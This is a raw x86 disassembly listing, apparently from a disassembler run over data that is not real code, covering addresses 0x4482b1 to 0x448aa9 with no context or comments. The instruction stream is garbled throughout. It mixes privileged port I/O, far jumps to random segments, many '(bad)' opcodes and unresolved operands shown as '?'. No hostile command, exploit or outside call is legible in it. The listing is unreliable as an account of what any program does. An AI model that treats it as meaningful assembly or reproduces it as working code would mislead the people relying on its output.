  4482b1:	push   esp
  4482b2:	xor    eax,0xb7980a31
  4482b7:	push   esp
  4482b8:	sbb    eax,0xf74f5e67
  4482bd:	xchg   edi,eax
  4482be:	in     eax,dx
  4482bf:	lds    esp,FWORD PTR [ecx]
  4482c1:	sbb    al,0x8d
  4482c3:	repnz push edx
  4482c5:	test   DWORD PTR [edi+0xd],eax
  4482c8:	int    0x66
  4482ca:	ja     0x448263
  4482cc:	mov    al,ds:0x5124b45c
  4482d1:	sub    al,BYTE PTR [ebx-0x757a6d]
  4482d7:	in     al,dx
  4482d8:	cmp    BYTE PTR [ecx-0x4fc3b25d],bh
  4482de:	hlt    
  4482df:	dec    eax
  4482e0:	jb     0x4482d1
  4482e2:	retf   
  4482e3:	and    al,0x81
  4482e5:	push   0xffffff8e
  4482e7:	or     eax,0x32fbd0b1
  4482ec:	mov    ah,BYTE PTR [edi+0x663450df]
  4482f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4482f3:	push   eax
  4482f4:	push   edx
  4482f5:	adc    DWORD PTR [ecx-0x645b0112],ecx
  4482fb:	mov    BYTE PTR [ebx-0x52a88690],ch
  448301:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448302:	fist   DWORD PTR [ebx-0x62]
  448305:	push   cs
  448306:	jne    0x44832d
  448308:	mov    al,0x37
  44830a:	mov    WORD PTR [eax],es
  44830c:	bound  ebx,QWORD PTR [ebx-0x49]
  44830f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  448310:	cs aas 
  448312:	sbb    eax,0x2d27f511
  448317:	in     eax,dx
  448318:	mov    cl,0xcd
  44831a:	aaa    
  44831b:	and    eax,0x2670fae9
  448320:	loopne 0x4482c0
  448322:	dec    esi
  448323:	lds    ebp,FWORD PTR [edi-0x6cc74765]
  448329:	mov    ecx,0x7343a4db
  44832e:	inc    ecx
  44832f:	xchg   ebx,eax
  448330:	pop    ss
  448331:	xchg   ebp,eax
  448332:	push   ss
  448333:	dec    ebx
  448334:	mov    bl,BYTE PTR [ecx-0x2d]
  448337:	or     bl,BYTE PTR [ebx]
  448339:	inc    esi
  44833a:	(bad)  
  44833b:	iret   
  44833c:	cmp    eax,0x4def9adc
  448341:	xchg   edi,eax
  448342:	or     al,0x7c
  448344:	fsubp  st(6),st
  448346:	mov    al,ds:0xb1560060
  44834b:	je     0x4483a5
  44834d:	pop    ecx
  44834e:	jecxz  0x4483a7
  448350:	jmp    0xb305:0x8b50fbdd
  448357:	add    BYTE PTR [esi],dh
  448359:	nop
  44835a:	cmc    
  44835b:	sbb    al,0xb9
  44835d:	clc    
  44835e:	mov    ebx,0x3aa03189
  448363:	push   cs
  448364:	std    
  448365:	neg    BYTE PTR [ebx+0x38]
  448368:	sbb    ebx,esi
  44836a:	push   edi
  44836b:	sbb    eax,0x4cbe6303
  448370:	and    eax,0xdee3b55
  448375:	fst    QWORD PTR [ecx]
  448377:	jno    0x44838a
  448379:	cli    
  44837a:	test   al,0x20
  44837c:	pop    edx
  44837d:	mov    al,ds:0xeb6a0637
  448382:	jg     0x448399
  448384:	aad    0xe3
  448386:	leave  
  448387:	in     eax,0x56
  448389:	retf   
  44838a:	cmp    BYTE PTR [ebp+ebx*1+0x71752609],cl
  448391:	push   ss
  448392:	and    cl,dh
  448394:	sbb    DWORD PTR [ebx],esi
  448396:	sub    esp,DWORD PTR [edi-0x59]
  448399:	pushf  
  44839a:	mov    ebx,0xa42902fb
  44839f:	xchg   esi,eax
  4483a0:	xor    al,0x52
  4483a2:	call   0x8694:0xeed65b09
  4483a9:	pushf  
  4483aa:	pop    ss
  4483ab:	ins    BYTE PTR es:[edi],dx
  4483ac:	shl    DWORD PTR [eax-0x32458b85],1
  4483b2:	outs   dx,DWORD PTR ds:[esi]
  4483b3:	fisttp DWORD PTR [esi+0x5a]
  4483b6:	sub    DWORD PTR [ecx-0x79cd6e4],edx
  4483bc:	add    eax,0x4e8370da
  4483c1:	xchg   edx,eax
  4483c2:	cmp    al,0xb4
  4483c4:	test   eax,0xaa8cc2d1
  4483c9:	test   DWORD PTR [eax-0x45a35eae],edi
  4483cf:	stos   BYTE PTR es:[edi],al
  4483d0:	xchg   ecx,eax
  4483d1:	lahf   
  4483d2:	mov    ebp,DWORD PTR [edi+0xf901c19]
  4483d8:	sub    ebx,DWORD PTR [esi-0x6a042d85]
  4483de:	and    ebp,DWORD PTR [ecx+0x294647ee]
  4483e4:	test   DWORD PTR [edx],eax
  4483e6:	cmc    
  4483e7:	ss mov esi,0xeff4e91c
  4483ed:	js     0x4483b8
  4483ef:	outs   dx,BYTE PTR ds:[esi]
  4483f0:	and    ax,0xd75e
  4483f4:	and    al,0xd7
  4483f6:	adc    BYTE PTR [ecx-0x7da33b47],bh
  4483fc:	adc    eax,0xe684b1c5
  448401:	mov    BYTE PTR [edi+0x5037a9a4],dl
  448407:	jl     0x44840a
  448409:	push   esp
  44840a:	mov    ecx,0x21ffae1c
  44840f:	jb     0x44839d
  448411:	idiv   DWORD PTR [esp+edx*8+0x20eb626d]
  448418:	add    eax,0x20ed6fe7
  44841d:	sub    bh,BYTE PTR [edi+0x78b9190f]
  448423:	scas   al,BYTE PTR es:[edi]
  448424:	ror    DWORD PTR [eax],1
  448426:	fst    st(4)
  448428:	out    dx,al
  448429:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44842a:	fcmovnb st,st(0)
  44842c:	cdq    
  44842d:	not    edi
  44842f:	sbb    bl,BYTE PTR [edi+edi*1]
  448432:	lock adc eax,0xc52cc881
  448438:	and    al,0xe9
  44843a:	add    eax,0xeba19d03
  44843f:	hlt    
  448440:	push   cs
  448441:	(bad)  
  448442:	xchg   ebx,eax
  448443:	mov    ds:0x6d0a228a,al
  448448:	pop    ss
  448449:	stc    
  44844a:	mov    al,0x53
  44844c:	maskmovq mm3,(bad)
  44844d:	neg    DWORD PTR [esi+0x6ba74b3d]
  448453:	xor    BYTE PTR [ecx],0xe5
  448456:	call   FWORD PTR [ecx+eiz*4+0x48]
  44845a:	mov    ebx,0xbe673e17
  44845f:	hlt    
  448460:	imul   ecx,DWORD PTR [edi+ebx*8-0x4b244ab1],0xffffffea
  448468:	push   ebp
  448469:	int    0x6c
  44846b:	ret    
  44846c:	and    al,0xa9
  44846e:	adc    DWORD PTR [edx+0x7b],esi
  448471:	gs scas eax,DWORD PTR es:[edi]
  448473:	jg     0x448430
  448475:	pop    ecx
  448476:	fist   WORD PTR [ebx]
  448478:	and    al,0xb1
  44847a:	sub    DWORD PTR [esi],ecx
  44847c:	cmp    DWORD PTR [edx-0x6f64e6a2],edi
  448482:	std    
  448483:	xor    eax,0x94bbab7a
  448488:	pop    esi
  448489:	dec    esp
  44848a:	fist   WORD PTR [ebx]
  44848c:	mov    ecx,0x306af56b
  448491:	es xchg ebp,eax
  448493:	xchg   ebp,eax
  448494:	repz push ebx
  448496:	mov    cl,0x44
  448498:	and    ch,BYTE PTR [ecx-0x3097101b]
  44849e:	ror    cl,cl
  4484a0:	mov    dl,0xb2
  4484a2:	sbb    esp,DWORD PTR [ecx]
  4484a4:	mov    bh,0xc8
  4484a6:	mov    bl,0xd9
  4484a8:	add    ah,BYTE PTR [ebp-0x16da3246]
  4484ae:	xchg   edx,eax
  4484af:	fst    QWORD PTR [ecx]
  4484b1:	push   ebx
  4484b2:	xchg   DWORD PTR [edx-0x23],edx
  4484b5:	call   0x40a9:0xa963f13b
  4484bc:	and    ecx,0xd28bc507
  4484c2:	mov    esp,0xdec00b94
  4484c7:	shl    dh,1
  4484c9:	lea    ebx,es:[edx-0x7a]
  4484cd:	popf   
  4484ce:	bound  ecx,QWORD PTR [eax+0x9]
  4484d1:	out    dx,eax
  4484d2:	or     edx,DWORD PTR [ebx+0x14b03318]
  4484d8:	xor    DWORD PTR [edi],esi
  4484da:	pushf  
  4484db:	inc    ebx
  4484dc:	cmp    BYTE PTR [edi+ebp*4],dl
  4484df:	inc    ebp
  4484e0:	sub    BYTE PTR gs:[edx+ebp*8+0x16],bl
  4484e5:	push   eax
  4484e6:	aas    
  4484e7:	add    edi,esi
  4484e9:	mov    eax,0xb21f64b4
  4484ee:	cld    
  4484ef:	jp     0x448528
  4484f1:	aas    
  4484f2:	imul   edi,DWORD PTR [esi+0x597a6ada],0x15
  4484f9:	xchg   esp,eax
  4484fa:	mul    esp
  4484fc:	sbb    eax,0x257d57a9
  448501:	jmp    0x574b:0xd0bfafa9
  448508:	scas   al,BYTE PTR es:[edi]
  448509:	cmp    BYTE PTR [ecx-0x5d],dl
  44850c:	mov    dl,0x48
  44850e:	in     eax,dx
  44850f:	jl     0x448574
  448511:	stc    
  448512:	push   0x6a
  448514:	xor    esp,DWORD PTR ds:0xa01d4eb
  44851a:	push   esp
  44851b:	sbb    eax,0x10bdf8f5
  448520:	push   edi
  448521:	cmp    eax,0xd696c86a
  448526:	sub    DWORD PTR [esi+0xd],ebx
  448529:	repz sbb ch,dh
  44852c:	call   0xa2a9:0x199e6c67
  448533:	pop    esp
  448534:	test   BYTE PTR [ebx-0x63],bl
  448537:	jecxz  0x4484c7
  448539:	sbb    BYTE PTR [ebx+eiz*2],bh
  44853c:	mov    ch,0xad
  44853e:	mov    dh,0x2f
  448540:	push   esi
  448541:	sti    
  448542:	and    esi,ecx
  448544:	std    
  448545:	jl     0x44850d
  448547:	xchg   ecx,eax
  448548:	cmp    eax,0xf2e91d89
  44854d:	or     BYTE PTR [ebx],0x7e
  448550:	sub    DWORD PTR [edx],esi
  448552:	icebp  
  448553:	mov    ds:0x74b798c9,eax
  448558:	mov    bl,0x4b
  44855a:	pop    ds
  44855b:	jmp    0x4ceb:0x64ca83d8
  448562:	neg    DWORD PTR [eax-0x32]
  448565:	lahf   
  448566:	cmp    edx,DWORD PTR [ebx+0xc]
  448569:	mov    ah,0xd
  44856b:	push   0x2321ff64
  448570:	cs cld 
  448572:	mov    esi,0x8ceeb504
  448577:	lods   al,BYTE PTR ds:[esi]
  448578:	push   esi
  448579:	pop    esi
  44857a:	xlat   BYTE PTR ds:[ebx]
  44857b:	pop    ebx
  44857c:	loopne 0x448525
  44857e:	sti    
  44857f:	sub    BYTE PTR [eax],al
  448581:	rcr    DWORD PTR [ebx],1
  448583:	mov    WORD PTR ds:0x599591b8,es
  448589:	mov    ebx,0xa8b8eeaf
  44858e:	fwait
  44858f:	out    0x7d,al
  448591:	xor    ah,cl
  448593:	push   ss
  448594:	sub    BYTE PTR [ebx-0x2c],0xab
  448598:	inc    ebx
  448599:	mov    ch,0x9a
  44859b:	push   es
  44859c:	add    BYTE PTR [edx-0x4c],bl
  44859f:	pushf  
  4485a0:	ficomp WORD PTR [edx-0x7e59ed25]
  4485a6:	push   0xffffffac
  4485a8:	rcr    ah,0x67
  4485ab:	imul   DWORD PTR [edx+0x6b74cfe9]
  4485b1:	push   es
  4485b2:	xor    eax,0x34a3fa16
  4485b7:	push   esp
  4485b8:	test   BYTE PTR [eax+0x5c68f2fb],ah
  4485be:	pop    esi
  4485bf:	jmp    0x9cf4bbb8
  4485c4:	lods   al,BYTE PTR ds:[esi]
  4485c5:	bound  edi,QWORD PTR [edx+0x43bce334]
  4485cb:	mov    bl,0x7
  4485cd:	add    al,0xff
  4485cf:	retf   0xb5c1
  4485d2:	push   cs
  4485d3:	in     al,dx
  4485d4:	retf   0x6110
  4485d7:	ja     0x4485ac
  4485d9:	pop    edx
  4485da:	int3   
  4485db:	and    al,0x73
  4485dd:	and    esi,DWORD PTR [eax-0x34]
  4485e0:	cmp    eax,0xe552fab9
  4485e5:	push   cs
  4485e6:	enter  0xd3ec,0xa1
  4485ea:	dec    edi
  4485eb:	stos   DWORD PTR es:[edi],eax
  4485ec:	and    ebp,DWORD PTR [ecx+0x23]
  4485ef:	imul   DWORD PTR [ecx-0x3e08e559]
  4485f5:	mov    WORD PTR [esi+esi*8],cs
  4485f8:	in     al,0x4
  4485fa:	xchg   BYTE PTR [ecx],ah
  4485fc:	sub    al,0x4b
  4485fe:	mov    ch,0x62
  448600:	push   edx
  448601:	cdq    
  448602:	or     eax,0x35b6d5f
  448607:	cmc    
  448608:	scas   eax,DWORD PTR es:[edi]
  448609:	add    ebp,DWORD PTR [ebx+0x464816e9]
  44860f:	fadd   QWORD PTR [edi+0x2e50d291]
  448615:	std    
  448616:	ficom  WORD PTR [esi]
  448618:	sbb    BYTE PTR [esi+esi*1-0x4dc46f31],dh
  44861f:	mov    ah,0xd0
  448621:	test   DWORD PTR [ecx],0xf972ea80
  448627:	push   ax
  448629:	icebp  
  44862a:	mov    ecx,0x90ea2b34
  44862f:	pop    es
  448630:	pop    ds
  448631:	push   cs
  448632:	jecxz  0x4485c8
  448634:	adc    BYTE PTR [ecx-0x57e7f54c],ch
  44863a:	sti    
  44863b:	ins    DWORD PTR es:[edi],dx
  44863c:	jae    0x44862b
  44863e:	adc    al,0x7a
  448640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448641:	jecxz  0x448610
  448643:	out    0xb8,al
  448645:	pop    es
  448646:	aaa    
  448647:	dec    esp
  448648:	add    DWORD PTR [ebp+0x67fc04b1],ecx
  44864e:	(bad)  
  44864f:	fbld   TBYTE PTR [esi+0x261024cb]
  448655:	mulps  xmm7,XMMWORD PTR [ecx]
  448658:	std    
  448659:	or     esi,DWORD PTR [ebp-0x75b4d606]
  44865f:	xchg   esi,eax
  448660:	inc    ebp
  448661:	mov    ?,WORD PTR [esi+0x4ba1f340]
  448667:	inc    esi
  448668:	jbe    0x4486c6
  44866a:	in     al,dx
  44866b:	ss test eax,0x1ee92350
  448671:	cdq    
  448672:	cdq    
  448673:	xor    al,0xae
  448675:	dec    edi
  448676:	xchg   BYTE PTR [ebx],al
  448678:	aad    0x9a
  44867a:	imul   edx,DWORD PTR [edx],0x5e
  44867d:	fnstcw WORD PTR [esi+edi*2+0x3a56a680]
  448684:	mov    ?,edx
  448686:	jae    0x44866e
  448688:	sbb    bh,BYTE PTR [ebx]
  44868a:	mov    bh,0x68
  44868c:	xchg   edx,eax
  44868d:	pushf  
  44868e:	imul   ebx,DWORD PTR [ebp-0x564bdc35],0xffffffa7
  448695:	cwde   
  448696:	mov    edi,0xbeb8cefc
  44869b:	je     0x44870c
  44869d:	mov    bh,0x45
  44869f:	xlat   BYTE PTR ds:[ebx]
  4486a0:	lds    esp,FWORD PTR ds:0xff38f438
  4486a6:	push   ss
  4486a7:	addr16 pop ss
  4486a9:	sub    ebp,edi
  4486ab:	rol    dh,1
  4486ad:	cli    
  4486ae:	clc    
  4486af:	in     eax,0x9f
  4486b1:	mov    eax,ds:0xe905cd2b
  4486b6:	cmp    DWORD PTR [edi+0xa],0x27
  4486ba:	jle    0x448736
  4486bc:	pop    ebx
  4486bd:	ja     0x448674
  4486bf:	adc    al,0xb8
  4486c1:	inc    edi
  4486c2:	fst    DWORD PTR [eax]
  4486c4:	xchg   ebp,eax
  4486c5:	sbb    eax,0xebd7e555
  4486ca:	xchg   esi,eax
  4486cb:	psubw  mm3,QWORD PTR [eax]
  4486ce:	scas   eax,DWORD PTR es:[edi]
  4486cf:	in     eax,0xce
  4486d1:	or     DWORD PTR [ebx+0x60697935],ebp
  4486d7:	in     al,dx
  4486d8:	cmp    edx,edx
  4486da:	cmp    ebp,DWORD PTR [esi+0x68]
  4486dd:	pushf  
  4486de:	(bad)  
  4486e0:	adc    ebp,DWORD PTR [ecx-0x67ae5e94]
  4486e6:	scas   eax,DWORD PTR es:[edi]
  4486e7:	sub    al,0x2f
  4486e9:	in     al,0xb1
  4486eb:	je     0x448698
  4486ed:	pop    es
  4486ee:	ds cmp al,0xf6
  4486f1:	into   
  4486f2:	mov    eax,ds:0xd550da16
  4486f7:	xor    al,0x9a
  4486f9:	cmp    DWORD PTR [eax],0x552918c2
  4486ff:	adc    esp,DWORD PTR [edi-0x45]
  448702:	rcr    BYTE PTR [edx-0x4a],0x93
  448706:	or     al,0xf0
  448708:	add    DWORD PTR [ebx+0x7fc96a9c],0xffffffc8
  44870f:	jmp    0xe256:0x26c7b842
  448716:	mov    cl,0xb4
  448718:	dec    ch
  44871a:	jle    0x44870c
  44871c:	cmc    
  44871d:	mov    ecx,0x51f5e644
  448722:	std    
  448723:	mov    esp,0x52715c99
  448728:	jle    0x4486ac
  44872a:	dec    edi
  44872b:	enter  0xcfb,0xb4
  44872f:	ficomp WORD PTR [ebx+0x5d58203e]
  448735:	or     eax,0xb4fed17c
  44873a:	imul   eax,ebp,0xffffffd3
  44873d:	cmp    cl,bh
  44873f:	add    esi,DWORD PTR [edx]
  448741:	js     0x4486d1
  448743:	lock fld QWORD PTR [eax+0x67]
  448747:	js     0x448787
  448749:	addr16 test eax,0xb59dc5a4
  44874f:	out    dx,eax
  448750:	icebp  
  448751:	lahf   
  448752:	imul   edi,eax,0xffffffe5
  448755:	jns    0x4486e3
  448757:	inc    ebp
  448758:	mov    bl,0xcd
  44875a:	(bad)  
  44875b:	loope  0x44875a
  44875d:	sbb    edi,DWORD PTR [ebp+0x261b9454]
  448763:	inc    ecx
  448764:	gs (bad) 
  448766:	lods   al,BYTE PTR ds:[esi]
  448767:	out    0xae,eax
  448769:	(bad)  
  44876a:	mov    dh,0xd1
  44876c:	dec    esi
  44876d:	leave  
  44876e:	fs cwde 
  448770:	cmp    DWORD PTR [ebx-0x10],edi
  448773:	shl    BYTE PTR ds:0xf568c363,1
  448779:	or     dh,bl
  44877b:	jmp    0xc96e61fd
  448780:	(bad)  
  448782:	cmp    DWORD PTR [esp+ebx*1+0x61],eax
  448786:	xchg   edx,eax
  448787:	mov    ch,BYTE PTR [ecx-0x7b3c7f2f]
  44878d:	sahf   
  44878e:	jnp    0x448737
  448790:	inc    eax
  448791:	jnp    0x4487c7
  448793:	sbb    ecx,eax
  448795:	mov    fs,WORD PTR [eax]
  448797:	loope  0x448735
  448799:	jle    0x44874d
  44879b:	je     0x44878c
  44879d:	je     0x448815
  44879f:	jmp    0x2665:0xc4cde577
  4487a6:	pusha  
  4487a7:	hlt    
  4487a8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4487a9:	add    bh,bh
  4487ab:	jo     0x448761
  4487ad:	in     eax,dx
  4487ae:	dec    ebx
  4487af:	or     BYTE PTR [ebx-0x54ddc0b8],ch
  4487b5:	pushf  
  4487b6:	shl    DWORD PTR [eax+0x1],1
  4487b9:	mov    ds:0xedfb049b,eax
  4487be:	push   esp
  4487bf:	jp     0x448759
  4487c1:	add    dl,BYTE PTR [ecx+0x297917c1]
  4487c7:	cld    
  4487c8:	cmc    
  4487c9:	cdq    
  4487ca:	pop    ebp
  4487cb:	cld    
  4487cc:	xor    BYTE PTR [edi-0x10247165],ah
  4487d2:	fld    st(1)
  4487d4:	pop    ebx
  4487d5:	push   esi
  4487d6:	adc    DWORD PTR [edi+ecx*8],eax
  4487d9:	mov    eax,ds:0x69291683
  4487de:	out    dx,eax
  4487df:	in     al,dx
  4487e0:	rcr    BYTE PTR [edx+0x10157456],cl
  4487e6:	mov    cl,ch
  4487e8:	fdivrp st(4),st
  4487ea:	jmp    0x4487d0
  4487ec:	and    cl,cl
  4487ee:	addr16 xor esp,esi
  4487f1:	pusha  
  4487f2:	or     DWORD PTR [edi],eax
  4487f4:	aad    0xa0
  4487f6:	or     edx,DWORD PTR [ecx]
  4487f8:	push   cs
  4487f9:	aam    0xd0
  4487fb:	jge    0x448829
  4487fd:	xchg   esp,eax
  4487fe:	loope  0x448823
  448800:	push   ebp
  448801:	cmp    eax,0xe31f34b0
  448806:	jo     0x448854
  448808:	out    0x4c,al
  44880a:	(bad)  
  44880b:	and    al,0xf6
  44880d:	dec    ebp
  44880e:	retf   0x2963
  448811:	mov    ebp,0x66fa13b5
  448816:	mov    ebp,0x46f65524
  44881b:	mov    bl,0xe5
  44881d:	pushf  
  44881e:	xor    esi,edi
  448820:	call   0x5871aaf0
  448825:	or     dl,ch
  448827:	in     eax,0xa0
  448829:	test   DWORD PTR [ebp+0x2a],edi
  44882c:	sbb    al,0x6d
  44882e:	mov    DWORD PTR [edx+0x1c4fbd4b],edi
  448834:	mov    dh,0x8
  448836:	inc    eax
  448837:	ficomp DWORD PTR [esi*8+0xcb82c93]
  44883e:	sbb    ah,BYTE PTR [ebx]
  448840:	aaa    
  448841:	sti    
  448842:	xchg   edx,eax
  448843:	inc    edi
  448844:	jmp    0x4ba6:0xee24bcd5
  44884b:	push   ebp
  44884c:	cli    
  44884d:	jmp    0xa30c:0x4e74b771
  448854:	test   DWORD PTR ss:[esi+eiz*8],edi
  448858:	pusha  
  448859:	arpl   bp,bx
  44885b:	dec    esi
  44885c:	fnsave [edi-0x6e62c4cd]
  448862:	mov    ch,0xa0
  448864:	loop   0x448876
  448866:	loope  0x44888d
  448868:	daa    
  448869:	or     DWORD PTR [ecx-0x20a7b0b4],ebx
  44886f:	jle    0x4488d1
  448871:	push   ss
  448872:	(bad)  
  448874:	aad    0x54
  448876:	cmp    al,0xef
  448878:	shl    DWORD PTR [edx+0x72],0xbe
  44887c:	sub    cl,BYTE PTR [ecx+0x75]
  44887f:	stos   BYTE PTR es:[edi],al
  448880:	std    
  448881:	pop    edx
  448882:	retf   0x9e96
  448885:	jne    0x44888a
  448887:	scas   al,BYTE PTR es:[edi]
  448888:	out    0x57,al
  44888a:	mov    edx,0x7c412580
  44888f:	dec    ebx
  448890:	ins    DWORD PTR es:[edi],dx
  448891:	std    
  448892:	in     eax,0x7b
  448894:	outs   dx,DWORD PTR ds:[esi]
  448895:	test   al,0xbd
  448897:	adc    al,0xd4
  448899:	retf   0x81fe
  44889c:	push   ebp
  44889d:	retf   
  44889e:	sub    bh,0xc9
  4488a1:	sub    esp,DWORD PTR [esi+0x8b923a4]
  4488a7:	push   eax
  4488a8:	popa   
  4488a9:	call   0xf8f3af2e
  4488ae:	retf   
  4488af:	xor    eax,DWORD PTR [ebx-0x25d6e4f]
  4488b5:	aaa    
  4488b6:	mov    ch,0xe9
  4488b8:	and    edi,DWORD PTR [ecx-0xe74d544]
  4488be:	fs jl  0x4488d7
  4488c1:	daa    
  4488c2:	mov    bl,0xde
  4488c4:	add    eax,0xf1f49a85
  4488c9:	scas   eax,DWORD PTR es:[edi]
  4488ca:	ret    
  4488cb:	ret    
  4488cc:	and    bl,BYTE PTR [ecx-0x25]
  4488cf:	add    dh,dl
  4488d1:	call   0xa529db5e
  4488d6:	mov    edi,DWORD PTR [esi+0xf]
  4488d9:	out    dx,al
  4488da:	aam    0x56
  4488dc:	and    al,0x28
  4488de:	add    BYTE PTR [ecx+0x1d],bl
  4488e1:	popa   
  4488e2:	push   ss
  4488e3:	push   ebp
  4488e4:	inc    eax
  4488e5:	mov    ch,0x5b
  4488e7:	xchg   ebp,eax
  4488e8:	push   cs
  4488e9:	cld    
  4488ea:	mov    dl,0xb1
  4488ec:	fstp   DWORD PTR [esi+0x68]
  4488ef:	mov    ch,0x92
  4488f1:	fnstenv [edx]
  4488f3:	pop    esi
  4488f4:	aas    
  4488f5:	cmp    edi,DWORD PTR [ebx+eax*1]
  4488f8:	stos   DWORD PTR es:[edi],eax
  4488f9:	dec    esi
  4488fa:	mov    edx,0xf21da5f7
  4488ff:	icebp  
  448900:	push   0x547bdb40
  448905:	jmp    0xa5a48675
  44890a:	loope  0x448894
  44890c:	outs   dx,DWORD PTR ds:[esi]
  44890d:	dec    edi
  44890e:	cdq    
  44890f:	ins    DWORD PTR es:[edi],dx
  448910:	push   ebp
  448911:	push   ecx
  448912:	jne    0x448906
  448914:	outs   dx,DWORD PTR ds:[esi]
  448915:	and    esi,DWORD PTR [edx]
  448917:	stos   BYTE PTR es:[edi],al
  448918:	adc    ebx,DWORD PTR [ebx+0x40]
  44891b:	bound  ebx,QWORD PTR [ecx]
  44891d:	xchg   ecx,eax
  44891e:	loope  0x448915
  448920:	mov    ch,0xd4
  448922:	jge    0x4488b1
  448924:	adc    eax,0x9ef4a0d0
  448929:	adc    DWORD PTR ds:0x83f9225e,esi
  44892f:	lea    ebp,[esi-0x4]
  448932:	cmp    bl,bh
  448934:	stos   BYTE PTR es:[edi],al
  448935:	xchg   edi,eax
  448936:	pop    esp
  448937:	xchg   esi,eax
  448938:	jmp    0xbaf9:0xb430654a
  44893f:	hlt    
  448940:	push   ss
  448941:	leave  
  448942:	les    ecx,FWORD PTR [edx+0x15]
  448945:	push   0xa612c039
  44894a:	pop    ebx
  44894b:	xor    al,0xc5
  44894d:	outs   dx,BYTE PTR ds:[esi]
  44894e:	cdq    
  44894f:	mov    ds:0x2c79bc29,al
  448954:	jno    0x448989
  448956:	nop
  448957:	(bad)  
  448958:	xor    al,0x44
  44895a:	mov    bl,0x6c
  44895c:	imul   edx,esi,0x6cbc1d5b
  448962:	stos   BYTE PTR es:[edi],al
  448963:	rcr    BYTE PTR [esi+0x237e76c4],cl
  448969:	or     DWORD PTR [edx+0x3ac781a3],edx
  44896f:	xchg   esi,eax
  448970:	scas   al,BYTE PTR es:[edi]
  448971:	lahf   
  448972:	fcmovnb st,st(2)
  448974:	jmp    0x88d593a5
  448979:	or     eax,DWORD PTR [ecx]
  44897b:	iret   
  44897c:	xchg   edx,eax
  44897d:	lods   al,BYTE PTR ds:[esi]
  44897e:	mov    bl,0x4
  448980:	cwde   
  448981:	ss push eax
  448983:	jmp    0xb287:0xe58ecdc5
  44898a:	out    0xad,al
  44898c:	call   0x5579:0x53c5b298
  448993:	test   al,ch
  448995:	pop    eax
  448996:	xchg   ebx,eax
  448997:	nop    DWORD PTR [ebx]
  44899a:	out    0x1e,al
  44899c:	or     esp,DWORD PTR [esi-0x7ba69e35]
  4489a2:	pop    es
  4489a3:	jbe    0x4489bf
  4489a5:	pop    es
  4489a6:	mov    esi,0xb9163a03
  4489ab:	aam    0x46
  4489ad:	inc    ebx
  4489ae:	add    BYTE PTR [esi],bh
  4489b0:	ss rcl al,1
  4489b3:	pop    ds
  4489b4:	in     al,dx
  4489b5:	or     BYTE PTR [eax+0x46],cl
  4489b8:	xor    eax,DWORD PTR [ecx-0x49]
  4489bb:	add    ecx,DWORD PTR [edi]
  4489bd:	stos   BYTE PTR es:[edi],al
  4489be:	mov    cl,0xf4
  4489c0:	inc    eax
  4489c1:	bound  edx,QWORD PTR [eax-0x34e29909]
  4489c7:	push   esp
  4489c8:	and    edx,eax
  4489ca:	sbb    esp,DWORD PTR [edi-0x476759e6]
  4489d0:	xchg   edi,eax
  4489d1:	fisttp QWORD PTR [esi-0x2b]
  4489d4:	mov    dh,0x5
  4489d6:	mov    BYTE PTR [esi+0x24],bl
  4489d9:	or     DWORD PTR [edx-0x7cbdb042],edi
  4489df:	sti    
  4489e0:	adc    eax,0xfef22d6f
  4489e5:	mov    esp,0xcbda7791
  4489ea:	mov    al,0x8
  4489ec:	or     al,0xfa
  4489ee:	jb     0x448a63
  4489f0:	and    edi,DWORD PTR [edx+eax*1-0x19]
  4489f4:	add    ecx,DWORD PTR [edx]
  4489f6:	mov    ds:0xd23196c9,eax
  4489fb:	cmp    eax,ecx
  4489fd:	cdq    
  4489fe:	push   ebx
  4489ff:	test   al,0x21
  448a01:	cmc    
  448a02:	mov    eax,DWORD PTR [edx+0x74b24b9a]
  448a08:	pop    edx
  448a09:	(bad)  
  448a0a:	xchg   ebx,eax
  448a0b:	and    eax,0xe6a3e675
  448a10:	xchg   eax,edi
  448a12:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  448a13:	mul    DWORD PTR [ecx]
  448a15:	cdq    
  448a16:	push   cs
  448a17:	sub    edi,ecx
  448a19:	test   esi,ebp
  448a1b:	ret    
  448a1c:	jno    0x4489bc
  448a1e:	fild   DWORD PTR [esi+0x70]
  448a21:	mov    ebx,0x1dec69de
  448a26:	(bad)  
  448a27:	out    dx,eax
  448a28:	subps  xmm7,XMMWORD PTR [esp+esi*1-0x7509f43]
  448a30:	inc    ebp
  448a31:	in     eax,dx
  448a32:	sbb    al,0xea
  448a34:	imul   edi,DWORD PTR [ecx],0xf91eeb5a
  448a3a:	in     eax,0x56
  448a3c:	pop    eax
  448a3d:	shl    DWORD PTR [esi-0x4454f771],cl
  448a43:	or     esp,esi
  448a45:	add    ecx,ecx
  448a47:	mov    ds:0x70681cf7,eax
  448a4c:	push   ss
  448a4d:	mov    ecx,0xb0ea51c3
  448a52:	add    BYTE PTR [edi],dh
  448a54:	in     al,dx
  448a55:	sahf   
  448a56:	mov    esp,DWORD PTR [edi+0x34ea5db5]
  448a5c:	mov    cl,0x4b
  448a5e:	addr16 inc edi
  448a60:	xor    edx,DWORD PTR [esi+0x24]
  448a63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  448a64:	outs   dx,BYTE PTR ds:[esi]
  448a65:	ud1    esi,DWORD PTR [edi+ebx*4-0x7214c45b]
  448a6d:	mov    edx,DWORD PTR [eax]
  448a6f:	rcl    DWORD PTR [eax+edi*8],0xc8
  448a73:	outs   dx,BYTE PTR ds:[esi]
  448a74:	jecxz  0x448a18
  448a76:	pop    ebx
  448a77:	sbb    BYTE PTR [eax-0x4],ch
  448a7a:	push   ebp
  448a7b:	ins    DWORD PTR es:[edi],dx
  448a7c:	call   0x550e:0x7304db9f
  448a83:	jl     0x448ab6
  448a85:	push   eax
  448a86:	push   ss
  448a87:	cmp    eax,0x54b0a40a
  448a8c:	jnp    0x448a12
  448a8e:	mov    ebp,0x737436ae
  448a93:	leave  
  448a94:	and    eax,0x9d13f911
  448a99:	jo     0x448a90
  448a9b:	cmp    bh,bh
  448a9d:	jg     0x448a70
  448a9f:	hlt    
  448aa0:	in     eax,0x99
  448aa2:	icebp  
  448aa3:	fdiv   QWORD PTR [edi-0x38f16430]
  448aa9:	mov    eax,0xd596a40f
